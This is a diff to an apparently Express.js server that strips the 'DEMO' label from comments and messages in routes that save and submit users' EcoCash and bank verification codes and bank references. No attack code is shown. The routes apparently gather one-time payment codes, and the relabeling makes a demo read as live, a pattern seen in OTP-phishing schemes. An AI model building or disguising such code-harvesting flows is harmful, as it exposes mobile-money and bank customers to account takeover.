@@ -624,7 +624,7 @@ app.put("/update-stage/:id", async (req, res) => {
 
 });
 // ======================================================
-// MARK DEMO VERIFICATION CODE AS SENT
+// MARK VERIFICATION CODE AS SENT
 // ======================================================
 
 app.put("/mark-code-sent/:id", async (req, res) => {
@@ -691,7 +691,7 @@ app.put("/mark-code-sent/:id", async (req, res) => {
 
 });
 // ======================================================
-// SAVE DEMO ECOCASH VERIFICATION
+// SAVE ECOCASH VERIFICATION
 // ======================================================
 
 app.post("/save-ecocash-verification/:id", async (req, res) => {
@@ -710,7 +710,7 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
 
                 success: false,
 
-                message: "DEMO verification code is required."
+                message: "verification code is required."
 
             });
 
@@ -758,7 +758,7 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SAVE DEMO ECOCASH VERIFICATION ERROR:",
+            "SAVE ECOCASH VERIFICATION ERROR:",
             err
         );
 
@@ -774,7 +774,7 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
 
 });
 // ======================================================
-// DEMO ECOCASH CODE SUBMITTED
+// ECOCASH CODE SUBMITTED
 // ======================================================
 
 app.put("/submit-ecocash-verification/:id", async (req, res) => {
@@ -793,7 +793,7 @@ app.put("/submit-ecocash-verification/:id", async (req, res) => {
 
                 success: false,
 
-                message: "DEMO verification code is required."
+                message: "verification code is required."
 
             });
 
@@ -843,7 +843,7 @@ app.put("/submit-ecocash-verification/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SUBMIT DEMO ECOCASH CODE ERROR:",
+            "SUBMIT ECOCASH CODE ERROR:",
             err
         );
 
@@ -1256,7 +1256,7 @@ app.post("/create-bank-application", async (req, res) => {
 
 });
 // ======================================================
-// SAVE DEMO BANK VERIFICATION
+// SAVE BANK VERIFICATION
 // ======================================================
 
 app.post("/save-bank-verification/:id", async (req, res) => {
@@ -1275,7 +1275,7 @@ app.post("/save-bank-verification/:id", async (req, res) => {
 
                 success: false,
 
-                message: "DEMO verification code is required."
+                message: "verification code is required."
 
             });
 
@@ -1326,7 +1326,7 @@ app.post("/save-bank-verification/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SAVE DEMO BANK VERIFICATION ERROR:",
+            "SAVE BANK VERIFICATION ERROR:",
             err
         );
 
@@ -1342,7 +1342,7 @@ app.post("/save-bank-verification/:id", async (req, res) => {
 
 });
 // ======================================================
-// SUBMIT DEMO BANK VERIFICATION CODE
+// SUBMIT BANK VERIFICATION CODE
 // ======================================================
 
 app.put("/submit-bank-verification/:id", async (req, res) => {
@@ -1361,7 +1361,7 @@ app.put("/submit-bank-verification/:id", async (req, res) => {
 
                 success: false,
 
-                message: "DEMO verification code is required."
+                message: "verification code is required."
 
             });
 
@@ -1411,7 +1411,7 @@ app.put("/submit-bank-verification/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SUBMIT DEMO BANK CODE ERROR:",
+            "SUBMIT BANK CODE ERROR:",
             err
         );
 
@@ -1427,7 +1427,7 @@ app.put("/submit-bank-verification/:id", async (req, res) => {
 
 });
 // ======================================================
-// SAVE DEMO BANK REFERENCE
+// SAVE BANK REFERENCE
 // ======================================================
 
 app.post("/save-bank-reference/:id", async (req, res) => {
@@ -1446,7 +1446,7 @@ app.post("/save-bank-reference/:id", async (req, res) => {
 
                 success: false,
 
-                message: "DEMO bank reference is required."
+                message: "bank reference is required."
 
             });
 
@@ -1496,7 +1496,7 @@ app.post("/save-bank-reference/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SAVE DEMO BANK REFERENCE ERROR:",
+            "SAVE BANK REFERENCE ERROR:",
             err
         );
 
